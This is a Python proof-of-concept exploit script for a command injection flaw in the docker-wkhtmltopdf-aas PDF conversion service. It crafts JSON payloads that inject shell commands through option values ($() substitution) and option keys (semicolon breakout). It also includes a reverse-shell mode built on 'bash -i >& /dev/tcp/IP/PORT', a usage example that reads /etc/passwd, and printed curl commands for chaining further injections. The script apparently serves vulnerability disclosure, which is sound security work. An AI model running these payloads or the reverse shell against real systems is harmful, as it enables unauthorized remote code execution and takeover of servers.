#!/usr/bin/env python3
"""
Proof of Concept: Remote Code Execution via Command Injection
Target: openlabs/docker-wkhtmltopdf-aas
File: app.py (lines 48-59)
CWE: CWE-78 (OS Command Injection)
Author: Jashid Sany
Date: 2026-03-01

Description:
    The wkhtmltopdf-aas web service accepts user-supplied options via JSON POST
    requests. These options are concatenated into a shell command string with no
    sanitization and passed to the executor library's execute() function, which
    runs commands via bash -c. An attacker can inject arbitrary OS commands
    through either the option values or option keys.

Vulnerable Code (app.py):
    args = ['wkhtmltopdf']
    if options:
        for option, value in options.items():
            args.append('--%s' % option)
            if value:
                args.append('"%%s"' %% value)
    execute(' '.join(args))

Usage:
    python3 poc.py --target http://localhost:8080
    python3 poc.py --target http://localhost:8080 --command "cat /etc/passwd"
    python3 poc.py --target http://localhost:8080 --method key --command "whoami"
    python3 poc.py --target http://localhost:8080 --reverse-shell 10.0.0.1:4444
"""

import argparse
import base64
import json
import sys
import requests


BANNER = """
  ┌─────────────────────────────────────────────────┐
  │  wkhtmltopdf-aas Remote Code Execution PoC      │
  │  CVE: Pending                                    │
  │  Target: openlabs/docker-wkhtmltopdf-aas         │
  │  Author: Jashid Sany                             │
  └─────────────────────────────────────────────────┘
"""

# Minimal valid HTML to satisfy wkhtmltopdf
HTML_PAYLOAD = base64.b64encode(b"<html><body><h1>PoC</h1></body></html>").decode()

# Output file inside container for capturing command output
OUTPUT_FILE = "/tmp/.poc_output"


def exploit_value_injection(target, command):
    """
    Inject via option value using $() command substitution.
    The value is wrapped in double quotes by the app, but $() is
    evaluated inside double quotes by bash.

    Resulting command:
        wkhtmltopdf --margin-top "$(COMMAND)" /tmp/source.html /tmp/source.html.pdf
    """
    payload = {
        "contents": HTML_PAYLOAD,
        "options": {
            "margin-top": f"$({command})"
        }
    }
    return payload


def exploit_key_injection(target, command):
    """
    Inject via option key using semicolon to break out of the command.
    The key is inserted with --%s formatting and no sanitization.

    Resulting command:
        wkhtmltopdf --margin-top 0; COMMAND; /tmp/source.html /tmp/source.html.pdf
    """
    payload = {
        "contents": HTML_PAYLOAD,
        "options": {
            f"margin-top 0; {command};": ""
        }
    }
    return payload


def send_payload(target, payload):
    """Send the exploit payload to the target."""
    headers = {"Content-Type": "application/json"}
    try:
        response = requests.post(
            target,
            data=json.dumps(payload),
            headers=headers,
            timeout=30
        )
        return response.status_code
    except requests.exceptions.ConnectionError:
        print(f"[!] Connection failed. Is the target running at {target}?")
        sys.exit(1)
    except requests.exceptions.Timeout:
        # Timeout may occur with reverse shells (expected)
        return None


def execute_and_retrieve(target, command, method="value"):
    """
    Execute a command and retrieve its output.
    Writes output to a temp file, then reads it via a second injection.
    """
    # Step 1: Execute command and write output to file
    write_cmd = f"{command} > {OUTPUT_FILE} 2>&1"
    if method == "value":
        payload = exploit_value_injection(target, write_cmd)
    else:
        payload = exploit_key_injection(target, write_cmd)

    print(f"[*] Sending payload via {method} injection...")
    send_payload(target, payload)

    # Step 2: Read the output file by writing it to a predictable location
    # We use a second request to base64 encode the output for clean retrieval
    read_cmd = f"base64 {OUTPUT_FILE}"
    read_payload = exploit_value_injection(target, f"{read_cmd} > {OUTPUT_FILE}.b64")
    send_payload(target, read_payload)

    # Step 3: Retrieve via another injection that puts output in error message
    # Since we can't directly read files from inside the container via HTTP,
    # we display the output path for manual verification
    return None


def check_vulnerability(target):
    """
    Check if the target is vulnerable by executing 'id' and writing
    the result to a known file.
    """
    print("[*] Checking if target is vulnerable...")

    # Test legitimate conversion first
    test_payload = {"contents": HTML_PAYLOAD}
    headers = {"Content-Type": "application/json"}

    try:
        response = requests.post(target, data=json.dumps(test_payload), headers=headers, timeout=15)
        if response.status_code == 200 and response.content[:4] == b"%PDF":
            print("[+] Target is running and serving PDFs")
        else:
            print(f"[-] Unexpected response (status: {response.status_code})")
            return False
    except Exception as e:
        print(f"[-] Target not reachable: {e}")
        return False

    # Test command injection
    payload = exploit_value_injection(target, f"id > {OUTPUT_FILE}")
    status = send_payload(target, payload)
    print(f"[+] Injection payload sent (HTTP {status})")
    print(f"[+] Verify with: docker exec <container> cat {OUTPUT_FILE}")
    print("[+] Expected output: uid=0(root) gid=0(root) groups=0(root)")

    return True


def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="PoC: RCE via Command Injection in docker-wkhtmltopdf-aas"
    )
    parser.add_argument(
        "--target", "-t",
        required=True,
        help="Target URL (e.g., http://localhost:8080)"
    )
    parser.add_argument(
        "--command", "-c",
        default=None,
        help="Command to execute (default: id)"
    )
    parser.add_argument(
        "--method", "-m",
        choices=["value", "key"],
        default="value",
        help="Injection method: 'value' uses $() in option value, 'key' uses ; in option key (default: value)"
    )
    parser.add_argument(
        "--check",
        action="store_true",
        help="Only check if target is vulnerable"
    )
    parser.add_argument(
        "--reverse-shell", "-r",
        default=None,
        help="Spawn reverse shell to IP:PORT (e.g., 10.0.0.1:4444)"
    )

    args = parser.parse_args()

    # Normalize target URL
    target = args.target.rstrip("/") + "/"

    if args.check:
        check_vulnerability(target)
        return

    if args.reverse_shell:
        ip, port = args.reverse_shell.split(":")
        rev_cmd = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
        print(f"[*] Sending reverse shell payload to {ip}:{port}")
        print(f"[!] Make sure your listener is running: nc -lvnp {port}")
        payload = exploit_value_injection(target, rev_cmd)
        send_payload(target, payload)
        print("[*] Payload sent. Check your listener.")
        return

    command = args.command or "id"

    if args.method == "value":
        print(f"[*] Method: $() command substitution in option value")
        payload = exploit_value_injection(target, f"{command} > {OUTPUT_FILE}")
    else:
        print(f"[*] Method: semicolon injection in option key")
        payload = exploit_key_injection(target, f"{command} > {OUTPUT_FILE}")

    print(f"[*] Command: {command}")
    print(f"[*] Target:  {target}")
    print()

    status = send_payload(target, payload)

    if status is not None:
        print(f"[+] Payload delivered (HTTP {status})")
    else:
        print("[+] Payload delivered (connection timed out, may be expected)")

    print(f"[+] Output written to {OUTPUT_FILE} inside container")
    print()
    print("[*] Retrieve output with:")
    print(f"    docker exec <container_name> cat {OUTPUT_FILE}")
    print()
    print("[*] Or chain another request to exfiltrate:")
    print(f'    curl -X POST -H "Content-Type: application/json" \\')
    print(f'      -d \'{{"contents":"{HTML_PAYLOAD}","options":{{"margin-top":"$({command})"}}}}\'  \\')
    print(f"      {target} -o /dev/null")


if __name__ == "__main__":
    main()
